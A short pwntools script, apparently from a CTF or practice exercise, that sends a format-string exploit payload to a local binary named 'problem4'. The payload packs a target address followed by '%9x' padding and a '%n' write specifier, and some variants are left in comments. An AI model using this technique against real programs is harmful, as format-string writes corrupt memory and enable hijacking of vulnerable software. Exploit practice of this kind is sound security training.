#-*- coing : utf-8 -*-
from pwn import *

p = process(["./problem4"])
pause()
payload = p32(0x08048540)
payload += "%9x"*7
payload += "%n"
#payload += "%hn"
#pause()
#print p.recvuntil(":")
sleep(0.5)
p.sendline(payload)

print payload
print p.recvline()

#leak_write = u32(p.recv(4))


